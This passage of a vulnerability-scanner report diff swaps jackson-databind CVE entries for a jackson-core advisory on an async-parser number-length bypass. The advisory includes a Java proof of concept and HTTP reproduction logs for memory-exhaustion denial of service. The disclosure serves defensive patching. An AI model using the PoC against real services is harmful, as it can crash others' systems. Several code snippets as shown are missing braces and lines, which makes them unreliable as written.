-│                        │     │                           │           /A:N 
-│                        │     │                           ╰ V3Score : 5.3 
-│                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
-│                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-│                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0
-│                        │     │                  │      e1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
-│                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5
-│                        │     │                  │      962 
-│                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5
-│                        │     │                  │      964 
-│                        │     │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security
-│                        │     │                  │      /advisories/GHSA-5jmj-h7xm-6q6v 
-│                        │     │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
-│                        │     │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
-│                        │     ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
-│                        │     ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
-│                        ├ [4] ╭ VulnerabilityID : CVE-2026-54516 
-│                        │     ├ VendorIDs        ─ [0]: GHSA-9fxm-vc8v-hj55 
-│                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-│                        │     ├ PkgPath         : opt/oaf/openaf.jar 
-│                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-│                        │     │                  │       @2.21.1 
-│                        │     │                  ╰ UID : 3293a4ace0bf5e 
-│                        │     ├ InstalledVersion: 2.21.1 
-│                        │     ├ FixedVersion    : 2.21.4, 3.1.4 
-│                        │     ├ Status          : fixed 
-│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
-│                        │     │                  │         97d9e39c5494d4581e40 
-│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
-│                        │     │                            f117adb7086d939b6bf5 
-│                        │     ├ SeveritySource  : ghsa 
-│                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54516 
-│                        │     ├ DataSource       ╭ ID  : ghsa 
-│                        │     │                  ├ Name: GitHub Security Advisory Maven 
-│                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-│                        │     │                          cosystem%3Amaven 
-│                        │     ├ Fingerprint     : sha256:1b1efba5cba8249892e11b7c17172b2eaf34d179246285064d73b
-│                        │     │                   feea16f2815 
-│                        │     ├ Title           : jackson-databind: jackson-databind: Security bypass due to
-│                        │     │                   improper handling of renamed properties 
-│                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-│                        │     │                   functionality and tree-model for Jackson Data Processor.
-│                        │     │                   From 2.21.0 until 2.21.4 and 3.1.4,
-│                        │     │                   POJOPropertiesCollector._renameProperties() allows a
-│                        │     │                   property with @JsonProperty("renamed") on the getter and
-│                        │     │                   @JsonIgnore on the setter to be renamed rather than dropped.
-│                        │     │                    With MapperFeature.INFER_PROPERTY_MUTATORS enabled
-│                        │     │                   (default), the private backing field is retained; during
-│                        │     │                   deserialization BeanDeserializerFactory.addBeanProps() sees
-│                        │     │                   hasField()==true, builds a FieldProperty, and makes the
-│                        │     │                   backing field writable. An attacker supplying the renamed
-│                        │     │                   JSON key writes the backing field directly, bypassing the
-│                        │     │                   @JsonIgnore on the setter. This vulnerability is fixed in
-│                        │     │                   3.1.4. 
-│                        │     ├ Severity        : MEDIUM 
-│                        │     ├ CweIDs           ─ [0]: CWE-915 
-│                        │     ├ VendorSeverity   ╭ ghsa  : 2 
-│                        │     │                  ╰ redhat: 2 
-│                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
-│                        │     │                  │        │           /A:N 
-│                        │     │                  │        ╰ V3Score : 5.3 
-│                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
-│                        │     │                           │           /A:N 
-│                        │     │                           ╰ V3Score : 5.3 
-│                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54516 
-│                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-│                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/c
-│                        │     │                  │      3d56dd25d52319828147c5b9aeabf2d485c250a 
-│                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/e
-│                        │     │                  │      88cb17006b6af4883b973058f0bb6486e5074af 
-│                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5967 
-│                        │     │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5968 
-│                        │     │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security
-│                        │     │                  │      /advisories/GHSA-9fxm-vc8v-hj55 
-│                        │     │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54516 
-│                        │     │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54516 
-│                        │     ├ PublishedDate   : 2026-06-23T21:17:02.723Z 
-│                        │     ╰ LastModifiedDate: 2026-06-27T20:52:12.103Z 
-│                        ├ [5] ╭ VulnerabilityID : CVE-2026-54517 
-│                        │     ├ VendorIDs        ─ [0]: GHSA-5hh8-q8hv-fr38 
-│                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-│                        │     ├ PkgPath         : opt/oaf/openaf.jar 
-│                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-│                        │     │                  │       @2.21.1 
-│                        │     │                  ╰ UID : 3293a4ace0bf5e 
-│                        │     ├ InstalledVersion: 2.21.1 
-│                        │     ├ FixedVersion    : 2.21.4, 3.1.4 
-│                        │     ├ Status          : fixed 
-│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
-│                        │     │                  │         97d9e39c5494d4581e40 
-│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
-│                        │     │                            f117adb7086d939b6bf5 
-│                        │     ├ SeveritySource  : ghsa 
-│                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54517 
-│                        │     ├ DataSource       ╭ ID  : ghsa 
-│                        │     │                  ├ Name: GitHub Security Advisory Maven 
-│                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-│                        │     │                          cosystem%3Amaven 
-│                        │     ├ Fingerprint     : sha256:75e6b1ea0a23a3e53b6eb81591459d5242e4ec74e874ec8052cea
-│                        │     │                   06a944d75ab 
-│                        │     ├ Title           : jackson-databind: jackson-databind: Information disclosure
-│                        │     │                   via improper JsonView filter application 
-│                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-│                        │     │                   functionality and tree-model for Jackson Data Processor.
-│                        │     │                   From 2.21.0 until 2.21.4 and 3.1.4, in
-│                        │     │                   BeanDeserializer._deserializeUsingPropertyBased, the
-│                        │     │                   active-view (@JsonView) filter was applied only to creator
-│                        │     │                   properties; the regular property-buffering branch performed
-│                        │     │                   no prop.visibleInView(activeView) check. A change making
-│                        │     │                   SetterlessProperty.isMerging() return true routed setterless
-│                        │     │                    Collection/Map properties through this unguarded path, so a
-│                        │     │                    setterless collection annotated with a restricted @JsonView
-│                        │     │                    is populated from attacker JSON even when the active view
-│                        │     │                   excludes it. This vulnerability is fixed in 2.21.4 and
-│                        │     │                   3.1.4. 
-│                        │     ├ Severity        : MEDIUM 
-│                        │     ├ CweIDs           ─ [0]: CWE-863 
-│                        │     ├ VendorSeverity   ╭ ghsa  : 2 
-│                        │     │                  ╰ redhat: 2 
-│                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
-│                        │     │                  │        │           /A:N 
-│                        │     │                  │        ╰ V3Score : 5.3 
-│                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
-│                        │     │                           │           /A:N 
-│                        │     │                           ╰ V3Score : 5.3 
-│                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54517 
-│                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-│                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/5
-│                        │     │                  │      bf23edb4221f7dd2ec8e71ff6d26c61640f261d 
-│                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/9
-│                        │     │                  │      4c5d215b3af1505098c686405d9641f041a9962 
-│                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5969 
-│                        │     │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5970 
-│                        │     │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security
-│                        │     │                  │      /advisories/GHSA-5hh8-q8hv-fr38 
-│                        │     │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54517 
-│                        │     │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54517 
-│                        │     ├ PublishedDate   : 2026-06-23T21:17:02.853Z 
-│                        │     ╰ LastModifiedDate: 2026-06-27T20:51:09.987Z 
-│                        ╰ [6] ╭ VulnerabilityID : CVE-2026-54518 
-│                              ├ VendorIDs        ─ [0]: GHSA-rcqc-6cw3-h962 
-│                              ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-│                              ├ PkgPath         : opt/oaf/openaf.jar 
-│                              ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-│                              │                  │       @2.21.1 
-│                              │                  ╰ UID : 3293a4ace0bf5e 
-│                              ├ InstalledVersion: 2.21.1 
-│                              ├ FixedVersion    : 2.21.4 
-│                              ├ Status          : fixed 
-│                              ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
-│                              │                  │         97d9e39c5494d4581e40 
-│                              │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
-│                              │                            f117adb7086d939b6bf5 
-│                              ├ SeveritySource  : ghsa 
-│                              ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54518 
-│                              ├ DataSource       ╭ ID  : ghsa 
-│                              │                  ├ Name: GitHub Security Advisory Maven 
-│                              │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-│                              │                          cosystem%3Amaven 
-│                              ├ Fingerprint     : sha256:b934ad5b74fa6ac91d8603333a607cb01a12c60d6111e53f4ecef
-│                              │                   770b9aa4b86 
-│                              ├ Title           : jackson-databind: jackson-databind: Information disclosure
-│                              │                   and data manipulation via view-based access control bypass[
-│                              │                   m 
-│                              ├ Description     : jackson-databind contains the general-purpose data-binding
-│                              │                   functionality and tree-model for Jackson Data Processor.
-│                              │                   From 2.21.0 until 2.21.4 and 3.1.4,
-│                              │                   UnwrappedPropertyHandler.processUnwrappedCreatorProperties()
-│                              │                    replays buffered JSON into creator parameters but never
-│                              │                   consults prop.visibleInView(activeView). The normal
-│                              │                   property-based creator path gates creator properties on the
-│                              │                   active view, but this unwrapped-creator replay path bypasses
-│                              │                    that check, so a constructor parameter annotated with both
-│                              │                   @JsonView(AdminView.class) and @JsonUnwrapped is populated
-│                              │                   from attacker JSON even when a more restrictive view is
-│                              │                   active. This vulnerability is fixed in 2.21.4 and 3.1.4. 
-│                              ├ Severity        : MEDIUM 
-│                              ├ CweIDs           ─ [0]: CWE-863 
-│                              ├ VendorSeverity   ╭ ghsa  : 2 
-│                              │                  ╰ redhat: 2 
-│                              ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L
-│                              │                  │        │           /A:N 
-│                              │                  │        ╰ V3Score : 6.5 
-│                              │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L
-│                              │                           │           /A:N 
-│                              │                           ╰ V3Score : 6.5 
-│                              ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54518 
-│                              │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-│                              │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/7
-│                              │                  │      21fa07ebbd4aab4a659a1a68940878315c3e341 
-│                              │                  ├ [3]: https://github.com/FasterXML/jackson-databind/commit/d
-│                              │                  │      633bc038f200c1397c07f1a2b46f58e72c91eea 
-│                              │                  ├ [4]: https://github.com/FasterXML/jackson-databind/pull/5971 
-│                              │                  ├ [5]: https://github.com/FasterXML/jackson-databind/pull/5973 
-│                              │                  ├ [6]: https://github.com/FasterXML/jackson-databind/security
-│                              │                  │      /advisories/GHSA-rcqc-6cw3-h962 
-│                              │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-54518 
-│                              │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-54518 
-│                              ├ PublishedDate   : 2026-06-23T22:16:32.073Z 
-│                              ╰ LastModifiedDate: 2026-06-27T20:49:30.977Z 
+│      ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : GHSA-r7wm-3cxj-wff9 
+│                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-core 
+│                        │      ├ PkgPath         : opt/oaf/openaf.jar 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.
+│                        │      │                  │       21.1 
+│                        │      │                  ╰ UID : 467cf72083aefd6e 
+│                        │      ├ InstalledVersion: 2.21.1 
+│                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 2.22.1 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-r7wm-3cxj-wff9 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Maven 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Amaven 
+│                        │      ├ Fingerprint     : sha256:674f7480c1e9d2090b3772296ccd26b53f53a520c4e8a6818f0c
+│                        │      │                   36db9e11ad57 
+│                        │      ├ Title           : jackson-core: Async parser maxNumberLength bypass via
+│                        │      │                   chunked digit accumulation (incomplete fix for
+│                        │      │                   GHSA-72hv-8253-57qq) 
+│                        │      ├ Description     : ## Summary
+│                        │      │                   
+│                        │      │                   The fix released in jackson-core `2.18.6` and `2.21.1` for
+│                        │      │                   [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-
+│                        │      │                   core/security/advisories/GHSA-72hv-8253-57qq) (Number
+│                        │      │                   Length Constraint Bypass in Async Parser, published
+│                        │      │                   2026-02-28) is incomplete. The fix commit `b0c428e6`
+│                        │      │                   (#1555) wired `validateIntegerLength` into a new
+│                        │      │                   `_setIntLength` helper and called it at every place where
+│                        │      │                   the integer portion of a number is *decided* (terminator
+│                        │      │                   byte arrived, `.` / `e/E` seen, end-of-feed inside a
+│                        │      │                   fully-buffered value). It did not call it on the much more
+│                        │      │                   attacker-relevant path: "ran out of input while still
+│                        │      │                   inside `MINOR_NUMBER_INTEGER_DIGITS`, return
+│                        │      │                   `NOT_AVAILABLE` to caller".
+│                        │      │                   As a result, an attacker who streams JSON to a non-blocking
+│                        │      │                    parser in many small chunks, without ever sending a
+│                        │      │                   terminator byte, can keep the parser inside
+│                        │      │                   `MINOR_NUMBER_INTEGER_DIGITS` indefinitely.
+│                        │      │                   `_textBuffer.expandCurrentSegment()` grows on every chunk,
+│                        │      │                   and `validateIntegerLength` is never invoked. The
+│                        │      │                   accumulator is only gated by `maxStringLength` (20 MiB
+│                        │      │                   default) — a **~20,000x amplification** of the documented
+│                        │      │                   `maxNumberLength` (1000 default).
+│                        │      │                   This is the same vulnerability class, same advisory wording
+│                        │      │                    ("Memory Exhaustion: Unbounded allocation in TextBuffer
+│                        │      │                   from excessively long numbers"), same parser class — just
+│                        │      │                   the streaming path the original fix didn't cover. The fix
+│                        │      │                   to the *fraction* path is correct (see
+│                        │      │                   `_finishFloatFraction` at line 1834-1837 of
+│                        │      │                   `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where
+│                        │      │                   `_setFractLength(fractLen)` IS called before the
+│                        │      │                   `NOT_AVAILABLE` return); the equivalent call is missing
+│                        │      │                   from every integer-digit path.
+│                        │      │                   ## Affected versions
+│                        │      │                   Verified on the patched releases:
+│                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
+│                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
+│                        │      │                   Structurally identical code in `tools.jackson.core` 3.0.x /
+│                        │      │                    3.1.x — same `NonBlockingUtf8JsonParserBase` class, same
+│                        │      │                   `_setIntLength` rollout, same NOT_AVAILABLE returns without
+│                        │      │                    validation. Not retested but presumed vulnerable.
+│                        │      │                   ## Affected code
+│                        │      │                   [`src/main/java/com/fasterxml/jackson/core/json/async/NonBl
+│                        │      │                   ockingUtf8JsonParserBase.java`](https://github.com/FasterXM
+│                        │      │                   L/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/ja
+│                        │      │                   ckson/core/json/async/NonBlockingUtf8JsonParserBase.java)
+│                        │      │                   in 2.18.6 / 2.21.1.
+│                        │      │                   ### Site 1 — `_startPositiveNumber(int ch)` lines
+│                        │      │                   1320-1330:
+│                        │      │                   ```java
+│                        │      │                   if (outPtr >= outBuf.length) {
+│                        │      │                       // NOTE: must expand to ensure contents all in a single
+│                        │      │                    buffer (to keep
+│                        │      │                       // other parts of parsing simpler)
+│                        │      │                       outBuf = _textBuffer.expandCurrentSegment();
+│                        │      │                   }
+│                        │      │                   outBuf[outPtr++] = (char) ch;
+│                        │      │                   if (++_inputPtr >= _inputEnd) {
+│                        │      │                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+│                        │      │                       _textBuffer.setCurrentLength(outPtr);
+│                        │      │                       return _updateTokenToNA();          // <-- no
+│                        │      │                   validateIntegerLength(outPtr)
+│                        │      │                   ```
+│                        │      │                   ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
+│                        │      │                   protected JsonToken _finishNumberIntegralPart(char[]
+│                        │      │                   outBuf, int outPtr) throws IOException {
+│                        │      │                       int negMod = _numberNegative ? -1 : 0;
+│                        │      │                       while (true) {
+│                        │      │                           if (_inputPtr >= _inputEnd) {
+│                        │      │                               _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+│                        │      │                               _textBuffer.setCurrentLength(outPtr);
+│                        │      │                               return _updateTokenToNA();    // <-- no
+│                        │      │                   validateIntegerLength(outPtr + negMod)
+│                        │      │                           }
+│                        │      │                           int ch = getByteFromBuffer(_inputPtr) & 0xFF;
+│                        │      │                           if (ch < INT_0) {
+│                        │      │                               if (ch == INT_PERIOD) {
+│                        │      │                                   _setIntLength(outPtr+negMod);   // <--
+│                        │      │                   validated here
+│                        │      │                                   ++_inputPtr;
+│                        │      │                                   return _startFloat(outBuf, outPtr, ch);
+│                        │      │                               }
+│                        │      │                               break;
+│                        │      │                           if (ch > INT_9) {
+│                        │      │                               if ((ch | 0x20) == INT_e) {
+│                        │      │                           ++_inputPtr;
+│                        │      │                           if (outPtr >= outBuf.length) {
+│                        │      │                               outBuf = _textBuffer.expandCurrentSegment();
+│                        │      │                           outBuf[outPtr++] = (char) ch;
+│                        │      │                       }
+│                        │      │                       _setIntLength(outPtr+negMod);            // <--
+│                        │      │                       return _valueComplete(JsonToken.VALUE_NUMBER_INT);
+│                        │      │                   The pattern recurs at lines 1297, 1329, 1343, 1365, 1395,
+│                        │      │                   1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out
+│                        │      │                   of input mid-integer" exit returns to the caller without
+│                        │      │                   validating the accumulator length.
+│                        │      │                   ### Compare with the fraction path that is correct
+│                        │      │                   `_finishFloatFraction` lines 1827-1838:
+│                        │      │                   while (loop) {
+│                        │      │                       if (ch >= INT_0 && ch <= INT_9) {
+│                        │      │                           ++fractLen;
+│                        │      │                               _setFractLength(fractLen);          // <--
+│                        │      │                   VALIDATED
+│                        │      │                               return JsonToken.NOT_AVAILABLE;
+│                        │      │                           ch = getNextSignedByteFromBuffer();
+│                        │      │                       ...
+│                        │      │                   ## Impact
+│                        │      │                   Reactive frameworks (Spring WebFlux / Reactor, Quarkus,
+│                        │      │                   Helidon, Vert.x JSON, anything wrapping
+│                        │      │                   `JsonFactory.createNonBlockingByteArrayParser()` or
+│                        │      │                   `createNonBlockingByteBufferParser()`) feed inbound
+│                        │      │                   HTTP/gRPC bytes to the async parser as they arrive.
+│                        │      │                   Operators who set
+│                        │      │                   `StreamReadConstraints.builder().maxNumberLength(N)` on the
+│                        │      │                    assumption that this caps memory per number value are not
+│                        │      │                   getting that guarantee in chunked-feed scenarios. The
+│                        │      │                   parser silently accumulates digits up to `maxStringLength`
+│                        │      │                   (20 MiB default) per concurrent connection. Multiply by
+│                        │      │                   attacker-controlled concurrency to OOM the JVM.
+│                        │      │                   The synchronous parsers (`UTF8StreamJsonParser`,
+│                        │      │                   `ReaderBasedJsonParser`) and the async parser on *complete*
+│                        │      │                    input are not affected — those paths go through
+│                        │      │                   `_setIntLength` or `ParserBase._reportTooLongIntegral`
+│                        │      │                   correctly.
+│                        │      │                   CWE-770 (Allocation of Resources Without Limits or
+│                        │      │                   Throttling), CVSS roughly the same as the parent advisory
+│                        │      │                   (Network / Low complexity / High availability impact). The
+│                        │      │                   parent advisory was scored CVSS 8.7 High.
+│                        │      │                   ## Proof of concept
+│                        │      │                   Standalone PoC, no Maven required:
+│                        │      │                   mkdir poc && cd poc
+│                        │      │                   curl -sLo jackson-core-2.18.6.jar
+│                        │      │                   https://repo1.maven.org/maven2/com/fasterxml/jackson/core/j
+│                        │      │                   ackson-core/2.18.6/jackson-core-2.18.6.jar
+│                        │      │                   cat > PoC.java <<'EOF'
+│                        │      │                   import com.fasterxml.jackson.core.*;
+│                        │      │                   import com.fasterxml.jackson.core.async.ByteArrayFeeder;
+│                        │      │                   public class PoC {
+│                        │      │                       public static void main(String[] args) throws Exception
+│                        │      │                    {
+│                        │      │                           StreamReadConstraints strict =
+│                        │      │                   StreamReadConstraints.builder()
+│                        │      │                                   .maxNumberLength(1000)
+│                        │      │                                   .build();
+│                        │      │                           JsonFactory f = new JsonFactoryBuilder()
+│                        │      │                                   .streamReadConstraints(strict)
+│                        │      │                           // Sanity: synchronous parser rejects 5000-digit
+│                        │      │                   int.
+│                        │      │                           try (JsonParser p = f.createParser("{\"v\":" +
+│                        │      │                   "1".repeat(5000) + "}")) {
+│                        │      │                               while (p.nextToken() != null) { /* drive */ }
+│                        │      │                               System.out.println("[-] BUG ABSENT: sync parser
+│                        │      │                    accepted");
+│                        │      │                               return;
+│                        │      │                           } catch (Exception e) {
+│                        │      │                               System.out.println("[+] sync parser rejected
+│                        │      │                   5000-digit int: " + e.getClass().getSimpleName());
+│                        │      │                           // Bug: async parser, chunked, no terminator.
+│                        │      │                           JsonParser ap =
+│                        │      │                   f.createNonBlockingByteArrayParser();
+│                        │      │                           ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
+│                        │      │                           byte[] preamble = "{\"v\":".getBytes("UTF-8");
+│                        │      │                           feeder.feedInput(preamble, 0, preamble.length);
+│                        │      │                           while (ap.nextToken() != JsonToken.NOT_AVAILABLE) {
+│                        │      │                    /* drain */ }
+│                        │      │                           byte[] digits = new byte[16 * 1024];
+│                        │      │                           for (int i = 0; i < digits.length; i++) digits[i] =
+│                        │      │                    (byte) ('1' + (i % 9));
+│                        │      │                           for (int c = 0; c < 600; c++) {
+│                        │      │                               feeder.feedInput(digits, 0, digits.length);
+│                        │      │                               JsonToken t = ap.nextToken();
+│                        │      │                               if (t != JsonToken.NOT_AVAILABLE) {
+│                        │      │                                   System.out.println("[-] unexpected token: "
+│                        │      │                    + t);
+│                        │      │                                   return;
+│                        │      │                           System.out.println("[+] BUG PRESENT: async parser
+│                        │      │                   accepted ~9.83 MB of digits with maxNumberLength=1000");
+│                        │      │                           // Closing the number now finally triggers the
+│                        │      │                   validator.
+│                        │      │                           feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
+│                        │      │                           feeder.endOfInput();
+│                        │      │                           try {
+│                        │      │                               while (ap.nextToken() != null) { /* drive */ }
+│                        │      │                               System.out.println("[*] late rejection on
+│                        │      │                   close: " + e.getMessage().split("\n")[0]);
+│                        │      │                           ap.close();
+│                        │      │                   EOF
+│                        │      │                   javac -cp jackson-core-2.18.6.jar PoC.java
+│                        │      │                   java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
+│                        │      │                   Observed output against `jackson-core-2.18.6`:
+│                        │      │                   [+] sync parser rejected 5000-digit int:
+│                        │      │                   StreamConstraintsException
+│                        │      │                   [+] BUG PRESENT: async parser accepted ~9.83 MB of digits
+│                        │      │                   with maxNumberLength=1000
+│                        │      │                   [*] late rejection on close: Number value length (9830400)
+│                        │      │                   exceeds the maximum allowed (1000, from
+│                        │      │                   `StreamReadConstraints.getMaxNumberLength()`)
+│                        │      │                   Observed output against `jackson-core-2.21.1`: identical.
+│                        │      │                   The 9.83 MB figure is purely a function of the loop bound
+│                        │      │                   (600 chunks * 16 KiB). The actual ceiling is
+│                        │      │                   `maxStringLength = 20 MiB`. With the strict policy declared
+│                        │      │                    as `maxNumberLength = 1000`, the parser permits **9830x**
+│                        │      │                   more allocation than the policy allows. With
+│                        │      │                   `maxStringLength` left at the default 20 MiB, an attacker
+│                        │      │                   can drive a single connection to 40 MiB of `char[]` heap
+│                        │      │                   (chars are 2 bytes each) before the validator finally fires
+│                        │      │                    on terminator/`endOfInput()`. Multiply by concurrent
+│                        │      │                   connections.
+│                        │      │                   ## End-to-end reproduction through real HTTP
+│                        │      │                   Supplements the standalone PoC with a running Spring Boot
+│                        │      │                   WebFlux server,
+│                        │      │                   driving the same bug through the actual reactor-netty +
+│                        │      │                   Jackson2JsonDecoder
+│                        │      │                   streaming-decode path that production reactive endpoints
+│                        │      │                   use.
+│                        │      │                   Setup:
+│                        │      │                   - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14,
+│                        │      │                    reactor-netty 1.1.23)
+│                        │      │                   - jackson-databind 2.17.2, jackson-core overridden:
+│                        │      │                     - VULN run:
+│                        │      │                   `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest
+│                        │      │                   published)
+│                        │      │                     - PATCHED run: `2.18.8-SNAPSHOT` built from the fix
+│                        │      │                   branch
+│                        │      │                   - JVM: OpenJDK 17.0.18
+│                        │      │                   - Server `JsonFactory` configured with
+│                        │      │                   `StreamReadConstraints.builder().maxNumberLength(1000).buil
+│                        │      │                   d()`
+│                        │      │                   Endpoint under test exposes the `Flux<DataBuffer>` request
+│                        │      │                   body directly to
+│                        │      │                   `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so
+│                        │      │                   the parser sees one
+│                        │      │                   HTTP chunk per `feedInput` (the same pattern used for any
+│                        │      │                   `@RequestBody Flux<...>` / streaming JSON decoder in
+│                        │      │                   WebFlux). A raw-socket
+│                        │      │                   HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of
+│                        │      │                    200 digit bytes
+│                        │      │                   each (50,000 digits total) at 20ms intervals, then writes
+│                        │      │                   the closing `}`.
+│                        │      │                   VULN — jackson-core 2.18.7:
+│                        │      │                   [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks;
+│                        │      │                   server still accepting
+│                        │      │                   [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
+│                        │      │                   HTTP/1.1 200 OK
+│                        │      │                   ERR after 6548ms
+│                        │      │                   cause=com.fasterxml.jackson.core.exc.StreamConstraintsExcep
+│                        │      │                   tion:
+│                        │      │                          Number value length (50000) exceeds the maximum
+│                        │      │                   allowed (1000, ...)
+│                        │      │                   Server-side controller trace (250 DataBuffer arrivals
+│                        │      │                   elided):
+│                        │      │                   [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
+│                        │      │                   [ctrl] DataBuffer arrived size=200 ms=42
+│                        │      │                   ...
+│                        │      │                   [ctrl] DataBuffer arrived size=199 ms=5993
+│                        │      │                   [ctrl] DataBuffer arrived size=1   ms=6518     <- closing
+│                        │      │                   '}'
+│                        │      │                   [ctrl] ERR after 6548ms ... Number value length (50000)
+│                        │      │                   exceeds ...
+│                        │      │                   Server held all 50,000 digit characters in `_textBuffer`
+│                        │      │                   for 6.5 seconds with
+│                        │      │                   `maxNumberLength=1000` declared. The validator never fires
+│                        │      │                   during streaming;
+│                        │      │                   it only fires at value-completion when the closing `}`
+│                        │      │                   arrives.
+│                        │      │                   PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
+│                        │      │                   [PATCHED-SMALLCHUNK] connection broke after 2801 digits at
+│                        │      │                   chunk 14: [Errno 32] Broken pipe
+│                        │      │                   [PATCHED-SMALLCHUNK] DONE: digits_sent=2801
+│                        │      │                   status=connection-broke-mid-stream
+│                        │      │                   Server-side controller trace:
+│                        │      │                   [ctrl] DataBuffer arrived size=6   ms=129
+│                        │      │                   [ctrl] DataBuffer arrived size=200 ms=142
+│                        │      │                   [ctrl] DataBuffer arrived size=200 ms=145
